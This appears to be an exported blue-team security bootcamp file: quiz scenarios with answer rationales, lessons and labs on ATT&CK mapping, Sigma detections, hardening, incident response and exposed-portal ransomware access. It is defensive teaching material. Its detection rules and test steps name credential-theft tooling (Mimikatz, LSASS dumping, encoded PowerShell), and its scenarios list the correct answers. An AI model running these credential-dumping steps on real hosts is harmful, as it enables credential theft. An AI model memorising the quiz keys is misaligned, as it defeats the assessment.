scenarios.title: Name the Tactic
scenarios.situation: An employee receives an email with a Word attachment. Opening it runs a macro that downloads a payload. You are mapping the incident to MITRE ATT&CK.
scenarios.prompt: Which tactic and technique best describe the email attachment step?
evidence: Email artifact
Subject: 'Past-due invoice' | Attachment: invoice.docm | Macro: auto-open -> download
choices: Initial Access — Phishing: Spearphishing Attachment (T1566.001): the attachment is the attacker's first foothold into the environment
Execution — the macro already ran, so this is purely Execution
Exfiltration — data has left the network
Impact — systems are being disrupted
scenarios.why: ATT&CK mapping starts with the attacker's objective at each step: the malicious attachment is how the adversary first gains access — Initial Access via spearphishing attachment. Execution describes what the macro does next, but the tactic that answers 'how did they get in?' is Initial Access. Correct mapping drives correct detection placement.
scenarios.hint: Where does the attacker's journey begin — and which tactic answers 'how did they get in?'

scenarios.title: Kill the Legacy Protocol
scenarios.situation: A vulnerability scan flags SMBv1 as enabled on twelve file servers. The infrastructure team says 'it's always been on' and worries about old multifunction printers.
scenarios.prompt: What is the right hardening decision?
evidence: Scan finding
SMBv1 (NT LM 0.12) negotiated successfully on 12 hosts — file/print server fleet
choices: Disable SMBv1 everywhere — it was weaponized by WannaCry and NotPetya; require SMBv2/v3 with signing and isolate legacy printers that truly need it
Keep SMBv1 — the printers might break
Enable SMBv1 on more hosts for consistency
Protocol version does not matter behind the firewall
scenarios.why: SMBv1's vulnerabilities enabled two of history's most destructive worm outbreaks; there is no compensating control that makes keeping it wise. Hardening means removing the protocol, enforcing signed SMBv2+, and handling the rare legacy device as an isolated exception — not letting the exception dictate the fleet's security.
scenarios.hint: Which ransomware families weaponized this exact protocol in 2017?

scenarios.title: Reading the Sigma Rule
scenarios.situation: A colleague shares a Sigma detection rule for credential theft. You need to evaluate what it actually catches before deploying it.
scenarios.prompt: What does the rule catch, and what is its key weakness?
evidence: Sigma rule (excerpt)
title: Mimikatz binary execution
logsource: {product: windows, category: process_creation}

detection:
  selection:
    EventID: 1
    Image|endswith: '\\mimikatz.exe'
  condition: selection
choices: It catches process creation of a binary literally named mimikatz.exe — trivially evaded by renaming; strengthen with behavior-based logic such as LSASS access or suspicious parent-child relationships
It catches all credential theft — deploy it and move on
It detects C2 network traffic — tune the ports
It is useless — delete it
scenarios.why: Name-based detection is the weakest form: renaming the binary defeats it instantly, and attackers do exactly that. Durable detections target behavior — accessing LSASS memory, suspicious parent processes, known-bad command lines — which survive renaming. The rule is a starting point, not coverage; detection engineering means iterating toward behavior.
scenarios.hint: What's the difference between the tool's name and its behavior — and which one survives a rename?

scenarios.title: The Suspicious Parent
scenarios.situation: Your EDR shows this process tree on a finance workstation: winword.exe spawned powershell.exe, which launched with a long Base64-encoded command line.
scenarios.prompt: How do you assess this?
evidence: Process tree

winword.exe (PID 4412)
 └─ powershell.exe -enc SQBFAFgA... (base64, 2,048 chars)
choices: High-fidelity alert — an Office application spawning an obfuscated PowerShell is a classic malicious pattern; isolate the host and investigate immediately
Normal behavior — Word uses PowerShell for spellcheck
Low priority — PowerShell is a legitimate Microsoft tool
Whitelist all child processes of winword.exe to reduce noise
scenarios.why: Parent-child process relationships are among the highest-signal telemetry in endpoint detection: legitimate software rarely has Word launching encoded PowerShell. Attackers abuse 'living off the land' binaries precisely because each one looks innocent alone — the relationship reveals the abuse. This pattern maps to Execution via malicious documents and warrants immediate containment.
scenarios.hint: When does a word processor legitimately need to launch an obfuscated shell?

scenarios.title: Which Log Sees Lateral Movement?
scenarios.situation: You suspect an attacker is moving laterally with PsExec-style techniques. You have limited log retention and must choose which sources to prioritize for the hunt.
scenarios.prompt: Which log combination best detects lateral movement?
evidence: Review the relevant secops-blue-team documentation.
choices: Windows Security log 4624 (logon types 3 and 10) correlated with Sysmon Event ID 1/3 (process and network) and System log 7045 (service installs) — multiple sources triangulate the movement
Firewall logs alone — they show everything important
Antivirus quarantine logs — they catch all malware
No log source can reliably show lateral movement
scenarios.why: Lateral movement touches multiple telemetry layers: authentication (4624 type 3 network / type 10 RDP logons), process and network activity (Sysmon 1/3), and persistence mechanics (7045 service creation for PsExec). No single source tells the whole story — correlation across them separates attacker movement from admin activity and defeats single-log blind spots.
scenarios.hint: One log type rarely tells the whole story — which combination covers authentication, process, and service activity?

scenarios.title: Tuning Without Blinding
scenarios.situation: Your new remote-access-tool detection fires 50 times a day — all from the IT admin team's legitimate remote-support tool on known admin workstations. The team wants the rule gone.
scenarios.prompt: How do you handle the false positives without losing coverage?
evidence: Rule stats
Fires/day: 50. True positives: 0. All from: admin-ws-{01..08}, tool: legitimate remote-support agent.
choices: Add a scoped exception for the known-good admin hosts and tool hash, keep the rule active, and schedule periodic review of the exception
Disable the rule — the noise is not worth it
Delete all exceptions on principle — exceptions are dangerous
Drop the rule to informational severity and stop reviewing it
scenarios.why: Tuning is surgery, not amputation: a narrowly scoped exception for a verified known-good pattern preserves detection coverage for every other host while eliminating the noise. Disabling the rule blinds you to actual attacker remote-access tools. The discipline is in scoping the exception tightly (specific hosts, signed binary hash) and reviewing it on a schedule.
scenarios.hint: What's the difference between tuning a rule and killing it?

domains.name: Exposed Portals & Ransomware Initial Access
domains.summary: How ransomware groups walk in through internet-facing management portals — the October 2026 telecom case — and the detection engineering and attack-surface discipline that stops it: T1190 mapping, external asset inventory, and hardening that removes the foothold.

scenarios.title: The portal on the internet
scenarios.situation: You inherit security for a regional telecom. Discovery finds the customer provisioning portal — the web app that manages subscriber services — directly internet-facing with no IP restriction. It is the same class of interface ransomware actors claimed as their way into a telecom in October 2026.
scenarios.prompt: How do you rate and sequence this finding?
evidence: Exposure

provisioning.customer.example:443 — internet-reachable
no IP allowlist, no VPN gate
admin + customer roles on one login page
Context
The portal can push configuration to subscriber equipment. Vendor patches are 60 days behind.
choices: Low priority: it is a customer portal, not a domain controller.

Critical external attack-surface finding: internet-facing management plane with config-push power. Sequence: gate it (VPN/ZTNA/allowlist) immediately, then patch, then audit access logs for prior probing.
Medium: add it to next quarter’s hardening backlog.
Accept the risk: customers need internet access to the portal.
scenarios.why: Management-plane exposure is one of the highest-value findings in external attack-surface work: whoever controls provisioning controls the subscribers. The October 2026 telecom case is a live reminder that ransomware groups walk in through exactly this door (ATT&CK T1190). Customers need the customer functions — not the management plane. Gate the management paths behind VPN/ZTNA or allowlisting now; the backlog can wait for lower-value items.
scenarios.hint: Separate what customers need from what administrators need. Which half must the internet reach?

scenarios.title: Read the intel like an analyst
scenarios.situation: A well-known threat-intel account posts that ransomware actors told it how they breached a telecom: through the internet-facing URL the ISP uses for managing customers. The post is vivid and specific — and single-sourced to the criminals themselves.
scenarios.prompt: What do you extract, and what do you refuse to assert?
evidence: Review the relevant exposed-portal-initial-access documentation.
choices: Extract the TTP (internet-facing management portal as initial access) as a hunting and hardening hypothesis; refuse to assert the specifics as verified fact — it is a threat-actor self-report via one account.
Treat the whole post as verified and brief the board that this exact path is confirmed.
Dismiss it entirely: criminals lie, so there is nothing to learn.
Repost it as an official incident report with your company logo.
scenarios.why: Threat-actor self-reports are leads, not verdicts: criminals exaggerate, and a single account relaying their words is one source. But the TTP itself — exposed management portals as ransomware initial access — is a well-documented pattern (T1190), independently worth hunting and hardening against. Good intel hygiene extracts the actionable hypothesis while labeling the specifics ‘unverified, single source’ until corroborated.
scenarios.hint: What part of the post is independently actionable even if the story is embellished?

scenarios.title: Catch the knock before the break-in
scenarios.situation: You decide to detect T1190-style probing against your own management portals. You have WAF logs, portal authentication logs, and EDR on the portal hosts.
scenarios.prompt: Which detection design best catches pre-ransomware portal probing?
evidence: Data sources

WAF: request paths, status codes, source ASNs
Portal auth log: logon attempts, MFA challenges
EDR on portal host: process creation, web-shell indicators
choices: Alert on any single 404 from the portal — probing starts with one bad request.

Correlate: burst of 4xx/5xx against /admin* and /manage* paths from a single ASN, followed by auth attempts with enumerated usernames, then any new process spawned by the web service account. One signal is noise; the sequence is the campaign.
Only monitor successful logons — failed attempts are just internet background radiation.
Buy a threat feed and wait for someone else’s IOCs.
scenarios.why: T1190 detection is a sequence, not a single event: internet background noise makes any lone 404 meaningless, and successful-logon-only monitoring misses the exploit path entirely. The detectable campaign is path enumeration (WAF 4xx bursts on management paths) → credential or exploit attempts (auth log) → post-exploitation (web-service account spawning shells — EDR). Correlating the three stages across data sources is what turns noise into a pre-ransomware warning.
scenarios.hint: A ransomware crew’s portal attack has chapters. Which single log sees only one chapter?

scenarios.title: Close the door properly
scenarios.situation: The board approves emergency hardening of the provisioning portal after the telecom breach news. Engineering proposes four options with very different costs and timelines.
scenarios.prompt: Which control set actually removes the T1190 foothold?
evidence: Review the relevant exposed-portal-initial-access documentation.
choices: Add a CAPTCHA to the login page and call it done.

Remove internet exposure of management paths (VPN/ZTNA gate or IP allowlist), enforce MFA, patch to current, enable WAF + auth-log alerting, and audit the last 90 days of portal logs for prior access.
Rename /admin to /admin2 — security through obscurity is cheap.
Block the ransomware group’s known IPs at the firewall.
scenarios.why: The foothold is the exposure itself: as long as the management plane is internet-reachable, every other control is a speed bump. Removing exposure (or gating it to known networks and identities) eliminates the T1190 path; MFA, patching, and monitoring then defend the remaining gated access. Renaming paths and blocking a few IPs are trivially bypassed — ransomware affiliates rotate infrastructure constantly, and scanners find renamed paths in minutes.
scenarios.hint: Which option removes the attacker’s path rather than decorating it?

scenarios.title: 3 AM logons from a foreign ASN
scenarios.situation: 02:47. Your new portal alert fires: 40 failed logons then 2 successful ones against the provisioning portal’s admin path, all from an ASN in a country where you have no customers or staff. MFA was not challenged on the successes — the accounts used legacy auth.
scenarios.prompt: What is your triage and first containment?
evidence: Alert

40x 401 then 2x 200 on /manage/login
source ASN: foreign, no business presence
accounts: svc-provision-02, admin-backup (legacy auth, no MFA)
Blast radius
svc-provision-02 can push config to subscriber equipment.
choices: Mark as a brute-force nuisance and re-enable the accounts in the morning.

Treat as active compromise of the management plane: disable the two accounts, block the ASN at the edge, isolate and image the portal host, and hunt for config pushes or persistence — successes after a spray on legacy-auth admin accounts is the break-in, not the knock.
Reset the passwords and leave the accounts enabled for business continuity.
Email the users and ask if it was them.
scenarios.why: Failed-spray-then-success on legacy-auth admin accounts from an impossible-travel ASN is the textbook shape of a successful portal intrusion — and with a provisioning service account, the attacker may already hold config-push power over subscribers. Containment means disabling the accounts (not just resetting passwords while leaving them enabled), blocking the source, and preserving the host for forensics before any cleanup. ‘Ask the user’ wastes the golden hour; these are service accounts — there is no user to ask.
scenarios.hint: Forty failures then two successes is not a nuisance pattern. What did the successes unlock?

scenarios.title: The leak site names you
scenarios.situation: A ransomware group’s leak site lists your company, claiming exfiltrated data and threatening publication. Operations are still running; you have no confirmation yet of what was actually taken.
scenarios.prompt: What are the first 24 hours’ priorities?
evidence: Review the relevant exposed-portal-initial-access documentation.
choices: Pay immediately to make the listing disappear.

Contain and scope first: isolate affected systems, preserve evidence, engage counsel and IR, verify what data is actually at risk before any external statement — and never negotiate from the compromised environment.
Announce on social media that it is a hoax to calm customers.
Wipe everything and restore from backup to erase the problem.
scenarios.why: A leak-site listing is a pressure tactic, not a verified fact sheet: groups exaggerate and sometimes list victims they barely touched. The first day belongs to containment, evidence preservation, and scoping under counsel — you cannot make sound decisions about notification or negotiation until you know what was actually accessed. Paying immediately funds the next attack and doesn’t guarantee deletion; public denial before scoping is a lie waiting to be disproven; wiping destroys the evidence you need.
scenarios.hint: The listing is designed to make you act before you think. What must you know before any irreversible decision?

scenarios.title: The Blue Team Operations Mystery

scenarios.prompt: Using the systems anatomy method (whole → cut open → step through → pull apart), how would you systematically trace a failure in Blue Team Operations?
choices: Walk the full journey: start from the trigger, verify each handoff in sequence, check dependencies at every step, and isolate where the flow breaks — then examine that specific layer
Restart all components — Blue Team Operations issues are always fixed by restarting
Check the most common cause from memory and apply that fix immediately
Escalate to senior support — Blue Team Operations is too complex to troubleshoot systematically

(3) Step through: verify each handoff — where does the expected output diverge from actual? (4) Pull apart: isolate the broken layer and examine it in detail. This method works for any Blue Team Operations failure in Secops Blue Team.
scenarios.hint: Don't jump to the fix. First map the journey, then find where it breaks.

lessons.title: Blue Team Operations — Core concepts
concepts: Detection engineering is a lifecycle: form a hypothesis from threat intel or ATT&CK, identify the data source, write the logic, test against known-good and known-bad, tune, deploy, and measure — then repeat.
MITRE ATT&CK gives defenders a common language: map every detection to tactic and technique so coverage gaps are visible and hunts are structured instead of random.
Sigma rules are portable detection logic: write once in the open Sigma format, convert to your SIEM's query language, and prefer behavior-based selections over filenames and hashes.

Hardening removes the footholds detections would otherwise have to catch: disable legacy protocols (SMBv1, LLMNR where possible), enforce signed SMB, patch promptly, and apply CIS-benchmark-style baselines.
Tune, don't delete: false positives are fixed with scoped exceptions and tighter logic, measured by precision before and after — every disabled rule is a blind spot.

example.code:
title: Suspicious PowerShell from Office app
detection:
  selection:
    EventID: 1
    ParentImage|endswith: '\winword.exe'
    Image|endswith: '\powershell.exe'
  condition: selection
example.walkthrough: This Sigma logic detects the parent-child pattern from the scenario — Word spawning PowerShell — rather than any filename the attacker controls. It converts to Splunk, Elastic, or Sentinel queries, and it survives binary renames because the relationship, not the name, is the signal.

pitfalls: Common trap: IOC-only detections — hashes and IPs decay in days; behavior endures.
Common trap: deploying a rule with no runbook — an alert nobody knows how to work is just noise with extra steps.
Common trap: tuning by deletion — removing noisy rules instead of scoping exceptions creates blind spots.
Common trap: hardening theater — changing banners and hiding versions while leaving SMBv1 on.
lessons.try_it: Work through this in the Labs tab.

lessons.title: Exposed Portals & Ransomware Initial Access — Core concepts
concepts: The October 2026 case, with sourcing labels: the EndZone ransomware group listed telecom provider gomomentum.com on its leak site on September 21, 2026 (documented by an automated scrape of the leak page). On October 7, a threat-intel account relayed the actors’ own claim that initial access came through the ISP’s internet-facing customer-management URL. Treat the leak listing as corroborated; treat the access-path detail as a single-source threat-actor claim.

The TTP class is well-established independent of any one incident: internet-exposed administrative and management portals are a top ransomware initial-access vector — MITRE ATT&CK T1190, Exploit Public-Facing Application. Telecom and ISP provisioning portals are especially prized because they reach subscriber infrastructure.

External attack-surface management is the preventive control: maintain a continuous inventory of every internet-facing interface, classify which ones carry management power, and treat any management plane reachable from the internet as a critical finding.

Hardening removes the foothold: take management paths off the internet (VPN/ZTNA gating or strict IP allowlisting), enforce phishing-resistant MFA, patch promptly, and put WAF plus authentication logging in front of what remains.

Detection is sequential: WAF 4xx/5xx bursts on /admin* and /manage* paths, then authentication anomalies, then web-service accounts spawning processes (EDR). Correlate the stages — any single stage alone is noise.

Intel hygiene: threat-actor self-reports are leads, not verdicts. Extract the actionable TTP hypothesis, label specifics as unverified until corroborated, and never brief single-source criminal claims as confirmed fact.

example.code: WAF: 214x 404 on /manage/* from ASN 64496 in 10 min -> portal auth: 40x 401 then 2x 200 (legacy auth, no MFA) -> EDR: w3wp.exe spawned cmd.exe
example.walkthrough: Three stages, three data sources, one campaign: enumeration of management paths, a successful spray against legacy-auth accounts, then post-exploitation on the portal host. No single stage proves intrusion — the 404 burst alone is internet noise — but the sequence across WAF, auth, and EDR logs is the T1190 kill chain in miniature. Write the detection as the correlation, not the parts.

pitfalls: Common trap: defending the login page instead of the exposure. CAPTCHAs and renamed paths don’t remove a T1190 foothold — gating the management plane off the internet does.
Common trap: monitoring only successful logons. By the time the logon succeeds, the attacker is inside; the probing stages are your early warning.
Common trap: briefing threat-actor claims as confirmed. ‘The criminals told an account how they did it’ is one source with every incentive to lie — corroborate before you assert.
Common trap: negotiating or investigating from the compromised environment. Assume the adversary reads what you type there.

lessons.title: How to Use This Blue Team Security Operations Bootcamp

What 'blue team analyst' means in practice: this bootcamp prepares you for the real-world responsibilities of a blue team analyst, not just exam questions. Every lesson connects theory to the decisions you'll make on the job — what to check first, what to try next, how to explain your reasoning.

The Blue team interviews and SOC operations strategy: (a) first pass — read every lesson in order without skipping, taking notes on concepts that feel unfamiliar; (b) second pass — work every scenario and lab, reading the 'why' explanations even for correct answers; (c) final pass — take the timed mock under realistic conditions (no pauses, no references).

How to read the scenarios: every scenario has a 'why' explanation — read it even when you got the answer right, because it explains the WRONG answers too (and real exams design wrong answers from those same misconceptions). The hint is there to unblock you, not to give away the answer.

Active recall beats re-reading: after each lesson, close the page and explain the key concepts out loud in your own words. If you can't explain it simply, you don't understand it yet — re-read that section.
Spaced repetition: revisit completed domains after 2-3 days. The bootcamp tracks your progress — use the dashboard to identify weak areas and drill those specifically before the mock.

lessons.title: Study Strategy: From Learning to Mastery
concepts: The learning pyramid: reading alone retains ~10%, but teaching someone else retains ~90%. After each domain, explain the concepts to an imaginary colleague — or better, a real one.
Deliberate practice: don't just re-read weak areas, actively test yourself on them. The scenario drills are designed for this — they force retrieval, not recognition.
Error analysis: every wrong answer is data. Log your misses by domain and concept. Patterns in your errors reveal exactly where to focus.
The 80/20 rule: 80% of exam/interview questions come from 20% of the material — the core concepts that everything else builds on. This bootcamp front-loads those in the early domains.
Sleep consolidates learning: study sessions followed by sleep outperform cramming. Don't sacrifice rest for extra hours — your brain needs downtime to build connections.

Choose a project that demonstrates the full lifecycle: planning → implementation → testing → documentation → presentation. A blue team analyst is expected to own work end-to-end.
Scope ruthlessly: a small project done well beats an ambitious project done poorly. Pick something you can complete in 2-4 weekends.
Document as you build, not after. Future-you (and interviewers) need to understand your decisions, not just your results.
Make it visible: GitHub repository with a professional README, architecture diagram, and demo instructions. If it's not on GitHub, it didn't happen.

No documentation — undocumented code is unusable code, and interviewers will ask you to explain your decisions.
Perfectionism paralysis — ship a working v1, then iterate. A deployed simple project beats an unreleased complex one.

lessons.title: Presenting Your Work: From Build to Interview Story
concepts: The STAR method for technical stories: Situation (context) → Task (your responsibility) → Action (what you did, specifically) → Result (measurable outcome).
Lead with the problem, not the technology. 'We needed to automate X because manual process took Y hours' is more compelling than 'I used tool Z.'
Quantify everything: time saved, errors reduced, performance improved, users served. Numbers make stories credible and memorable.
Prepare for deep dives: interviewers will pick one detail and probe. Know your architecture cold — every component, every tradeoff, every alternative you considered.
Show the messy parts: what went wrong, how you debugged it, what you'd do differently. This demonstrates maturity more than a flawless narrative.

example.code:

Strong: 'Our team spent 6 hours weekly on manual deployments. I built an automated pipeline using [tools] that cut deployment time to 15 minutes and eliminated config drift. The hardest part was [challenge] — I solved it by [approach].'
example.walkthrough: Notice the structure: problem (6 hours wasted) → action (built pipeline) → result (15 min, no drift) → depth (hardest part + solution). Practice telling your capstone story in 2 minutes, then be ready to go deep on any part.

pitfalls: Vague claims without specifics — 'I improved performance' means nothing; 'I reduced load time from 4s to 800ms by...' is compelling.
Only preparing the happy path — interviewers specifically ask about failures and challenges.
Memorizing a script — stories should feel conversational, not rehearsed. Know the beats, not the words.
No demo ready — always have a live demo, screenshots, or video. 'Let me show you' beats 'trust me.'

Build in public: share your learnings (blog posts, conference talks, open source contributions). Teaching solidifies your knowledge and builds your professional reputation.
Find your niche: general competence gets you hired, but deep expertise in a specific area makes you indispensable. Use the capstone to explore what energizes you.
Mentor others: explaining concepts to junior colleagues is the fastest way to deepen your own understanding and develop leadership skills.
Stay current: follow key practitioners, read release notes, experiment with new tools in a lab. Allocate 2-3 hours weekly to deliberate learning.

lessons.title: SOC Tiers and Escalation
concepts: Tier 1 analysts triage alerts: initial review, false positive elimination, basic enrichment — 80% of alerts die here
Tier 2 analysts investigate: deep dive on escalated alerts, threat hunting, incident scoping — the analytical core
Tier 3 / IR handles confirmed incidents: containment, eradication, recovery, lessons learned
Escalation criteria must be explicit: what severity, what indicators, what SLA for each tier

example.code:
Alert: Suspicious PowerShell execution
  T1: Check prevalence, parent process, command line → Looks like admin script? Close as benign.
       → Obfuscated + rare + external IP? Escalate to T2 with context.
  T2: Analyze script, check for C2, scope affected hosts → Confirmed malicious? Escalate to IR.
  T3: Isolate hosts, block IOCs, hunt for persistence, write report.
example.walkthrough: Each tier adds context and narrows scope. T1 filters noise, T2 confirms maliciousness, T3 responds. Without clear escalation paths, alerts either die prematurely or overwhelm senior analysts.

pitfalls: No defined escalation criteria — analysts guess, leading to inconsistent handling
Skipping enrichment at T1 — escalating without context wastes T2 time
Treating every alert equally — not all suspicious activity is malicious; prioritize by risk
lessons.try_it: Write escalation criteria for three alert types: phishing, malware detection, and anomalous login. Define what T1 checks, what triggers T2, and what triggers IR.

lessons.title: Alert Tuning and False Positives
concepts: False positives are the SOC's biggest time sink — tuning detections to reduce noise without missing true positives is a core skill
Baseline normal behavior first: what's expected in YOUR environment? Generic rules generate generic noise
Tune in layers: suppress known-good (allowlist), refine logic (narrow conditions), adjust thresholds (risk-based)
Measure: track false positive rate per rule; retire or rewrite rules that consistently produce noise

example.code:
Noisy rule: 'Alert on any PowerShell with -EncodedCommand'
  Problem: Admins use this legitimately daily → 500 alerts/day, 0 true positives
  
Tuned rule: 'Alert on -EncodedCommand WHERE parent is Office app OR command length > 5000 OR decoded contains Invoke-Mimikatz'
  Result: 5 alerts/day, 3 true positives
example.walkthrough: The tuned rule adds context that distinguishes malicious from benign. This requires understanding YOUR environment — what do your admins normally do?

pitfalls: Disabling noisy rules instead of tuning — you lose visibility; tune, don't blind
Tuning based on one incident — ensure the refined logic still catches variants
No feedback loop — analysts must report false positives so engineers can tune
lessons.try_it: Pick your noisiest detection rule. Analyze 20 recent alerts: how many were true positives? Propose three tuning refinements.

lessons.title: Threat Intelligence Integration
concepts: Threat intel is actionable information about adversaries — not just IOC feeds, but TTPs, motivations, and targeting
The intel cycle: requirements → collection → processing → analysis → dissemination → feedback
Operationalize intel: convert reports into detections, hunting hypotheses, and defensive recommendations
Measure intel value: did it lead to detections, prevent incidents, or improve response? Vanity metrics (feed size) don't matter

example.code:
Intel report: 'APT29 using new OAuth app for persistence'
  → Detection: Alert on OAuth app grants with high-privilege scopes from unusual IPs
  → Hunt: Search historical logs for similar app grants in past 90 days
  → Harden: Require admin approval for third-party OAuth apps
example.walkthrough: One intel report becomes three defensive actions. This is the difference between 'collecting intel' and 'using intel.'

pitfalls: IOC-only focus — IPs/domains change hourly; TTPs (behaviors) are more durable
No dissemination — intel that stays with one analyst helps no one; share actionable summaries
Trusting single sources — corroborate before operationalizing; false intel creates false positives
lessons.try_it: Take a recent threat report. Write three concrete actions: one detection, one hunt, one hardening recommendation.

lessons.title: Detection Lifecycle
concepts: Detections follow a lifecycle: design → develop → test → deploy → tune → retire — skipping steps creates blind spots or noise
Design starts with the adversary: what TTP are you detecting? Map to MITRE ATT&CK for coverage analysis
Test with true positives (atomic tests, adversary emulation) AND true negatives (normal activity shouldn't trigger)
Deploy progressively: log-only → alert → automated response. Never go straight to blocking without validation

example.code:
Detection: LSASS credential dumping
  ATT&CK: T1003.001
  Logic: Process access to lsass.exe WHERE granted_access has 0x1010 OR 0x1438
  Test TP: Run Mimikatz Sekurlsa::logonpasswords → should fire
  Test TN: Normal logon, antivirus scan → should NOT fire
example.walkthrough: Atomic testing proves the detection works. Without TP/FP validation, you're guessing — and guesses become either blind spots or alert fatigue.

pitfalls: No ATT&CK mapping — you can't measure coverage or find gaps without a framework
Testing only true positives — a detection that fires on everything is worse than no detection
Deploying directly to blocking — false positives become outages; validate in alert mode first
lessons.try_it: Design a detection for a common ATT&CK technique. Write the logic, define TP/FP test cases, and map the coverage.

lessons.title: IR Phases: Preparation
concepts: Preparation is the most neglected IR phase — and the most important. You can't respond effectively without playbooks, tools, and practice
Essential preparations: defined roles (who does what), communication plans (who gets notified when), tool access (do you have what you need BEFORE the incident?)
Playbooks for common scenarios: phishing, malware, data breach, ransomware — step-by-step, tested, updated
Tabletop exercises: walk through scenarios without a real incident. Find gaps in plans before attackers find gaps in defenses

example.code:
IR Readiness Checklist:
  [ ] Roles assigned (lead, comms, technical, legal)
  [ ] Playbooks for top 5 scenarios (tested this quarter)
  [ ] Tool access verified (EDR, SIEM, firewall, email)
  [ ] Contact list current (internal + external)
  [ ] Backup restore tested (not just 'we have backups')
example.walkthrough: Run this checklist quarterly. The incident will happen at 2 AM on a holiday — preparation determines whether it's a controlled response or chaos.

pitfalls: No playbooks — improvising during an incident wastes critical time
Untested backups — 'we have backups' means nothing until you've restored from them
Stale contacts — the IR lead left 6 months ago and nobody updated the plan
lessons.try_it: Conduct a tabletop exercise: simulate a ransomware incident. Walk through each phase and document gaps in your current preparation.

lessons.title: IR Phases: Detection to Recovery
concepts: Detection & Analysis: confirm the incident is real, determine scope (what's affected?), preserve evidence
Containment: stop the bleeding — isolate affected systems, block malicious infrastructure, but preserve evidence
Eradication: remove the threat — kill persistence mechanisms, patch vulnerabilities, reset credentials
Recovery: restore operations — bring systems back online in priority order, monitor for re-infection
Lessons Learned: within 2 weeks, document what happened, what worked, what to improve — blameless post-mortem

example.code:
Ransomware detected on 3 workstations:
  Detection: EDR alert → analyst confirms encryption activity
  Containment: Isolate hosts from network (preserve RAM for forensics)
  Eradication: Identify patient zero, remove persistence, patch exploited vuln
  Recovery: Restore from clean backups, verify integrity, phased return
  Lessons: How did it get in? Why wasn't it detected sooner?
example.walkthrough: Containment before eradication — if you start cleaning before isolating, the attacker spreads. Order matters.

pitfalls: Skipping containment to 'fix it fast' — the attacker moves laterally while you're cleaning
Destroying evidence during eradication — you need forensics to understand the full scope
No lessons learned — the same incident will happen again without process improvements
lessons.try_it: Write an IR playbook for a phishing-led malware infection. Cover all five phases with specific actions and decision points.

lessons.title: Hunting Methodologies
concepts: Threat hunting is proactive — searching for undetected threats, not waiting for alerts
Hypothesis-driven: start with an idea ('APT29 uses X technique, let's look for it'), not random log diving
Intel-driven: use threat reports to generate hypotheses about what might be in YOUR environment
Analytics-driven: use statistics and ML to find anomalies, then investigate — 'what's weird here?'

example.code:
Hunt hypothesis: 'Attackers use WMI for lateral movement without triggering EDR'
  → Data: WMI operational logs (Event ID 5857, 5858)
  → Baseline: Normal WMI usage in this environment
  → Anomaly: WMI from unusual processes or to unusual targets
  → Investigate: Is this admin activity or attacker lateral movement?
example.walkthrough: A good hypothesis is testable and scoped. 'Find evil' isn't a hypothesis; 'WMI lateral movement leaves traces in Event ID 5858' is.

pitfalls: Hunting without hypotheses — random log review is inefficient and demoralizing
No baseline — you can't spot anomalies without knowing normal
Hunt findings not converted to detections — the same threat will evade again next time
lessons.try_it: Write three hunt hypotheses based on recent threat intel. For each: define the data source, baseline, and what 'suspicious' looks like.

lessons.title: Evidence Collection Principles
concepts: Order of volatility: collect the most ephemeral evidence first — RAM before disk, network connections before logs
Write blockers for disk imaging — never analyze the original; work on forensic copies
Chain of custody: document every person who handled evidence, every action taken — admissibility depends on it
Don't contaminate: booting a suspect machine alters timestamps; live response tools leave traces — minimize footprint

example.code:
Live response priority:
  1. RAM capture (volatile, lost on shutdown)
  2. Network connections (netstat, active sessions)
  3. Running processes (with command lines)
  4. Disk image (write-blocked, bit-for-bit)
  5. Logs (may be tampered — collect early)
example.walkthrough: Shutting down a compromised machine destroys RAM evidence (encryption keys, injected code, network connections). Capture memory FIRST.

pitfalls: Powering off before RAM capture — destroys the most valuable volatile evidence
Analyzing the original disk — always work on copies; originals are for court
No documentation — 'I looked at the logs' isn't chain of custody
lessons.try_it: Create a live response checklist for a suspected compromised workstation. Order by volatility and include the tool for each step.

lessons.title: Log Sources and Normalization
concepts: You can't detect what you can't see — ensure critical log sources are collected: authentication, process execution, network, DNS, email, cloud audit
Normalization maps different log formats to a common schema — without it, correlation is impossible
Common schemas: CIM (Splunk), ECS (Elastic), ASIM (Sentinel) — pick one and enforce it
Log volume management: collect broadly, retain strategically — hot/warm/cold tiers balance cost and accessibility

example.code:
Essential log sources:
  ✓ Windows Security (4624/4625 logons, 4688 process creation)
  ✓ Sysmon (process, network, registry — the gold standard)
  ✓ Firewall (allowed/denied connections)
  ✓ DNS (queries — C2 often hides here)
  ✓ Cloud audit (Azure AD sign-ins, AWS CloudTrail)
  ✗ Application logs (often missing — work with app teams)
example.walkthrough: Sysmon + Windows Security logs catch 90% of endpoint threats. If you're missing these, you're flying blind on workstations.

pitfalls: Collecting without normalizing — 10 formats for 'user login' means 10 different queries
No retention policy — either drowning in storage costs or missing historical data for hunts
Ignoring cloud logs — attackers target cloud; on-prem-only visibility is incomplete
lessons.try_it: Audit your log sources against the essential list. Identify gaps and prioritize by detection value vs. implementation effort.

labs.title: Write a Sigma Rule
labs.objective: Author a Sigma detection for password-spraying against Windows logons and validate its logic.
steps: Define the log source: Windows Security log, event 4625 (failed logon).
Write a selection matching 4625 events with the same target account across many source IPs — or many accounts from one IP.
Add an aggregation condition: threshold of failures within a time window.
Document two known-good patterns that could false-positive (vulnerability scanners, misconfigured services).
Write the tuning note: what exception or threshold change you would apply first.

checks.hint: Review your Sigma YAML and confirm it has a detection condition with a threshold.

labs.title: ATT&CK Mapping Exercise
labs.objective: Map a multi-stage intrusion scenario to MITRE ATT&CK tactics and identify detection gaps.
steps: Read the provided intrusion narrative (phish to domain admin) end to end.
Assign each attacker action to an ATT&CK tactic and technique ID.
For each mapped technique, note which log source would record it.
Mark the techniques where your current logging has no coverage.
Prioritize the top two coverage gaps by attacker value and write a one-line detection idea for each.

checks.hint: Check your mapping document includes technique IDs such as T1566 for the phishing step.

labs.title: External Attack-Surface Inventory
labs.objective: Enumerate internet-facing management interfaces in a fictional estate and rank them by management power.
steps: Open the Terminal tab. You will inventory the fictional example estate’s edge.
Type exactly: dig +short customer.example — resolve the customer portal.
Type exactly: curl -sI https://manage.example — fingerprint the management path.
Type exactly: manage.example:443 EXPOSED — record the critical finding.
Classify each interface: customer-only vs management power, and note which ones must never face the internet.
Write the remediation order: gate, patch, log, audit history.

checks.hint: Resolve the customer portal: dig +short customer.example.
Fingerprint the management path: curl -sI https://manage.example.

labs.title: Sigma Rule for Portal Probing (T1190)
labs.objective: Author Sigma-style detection logic correlating WAF probing with portal authentication anomalies.
steps: Open the Terminal tab. Define the log sources first: WAF request logs and portal authentication logs.
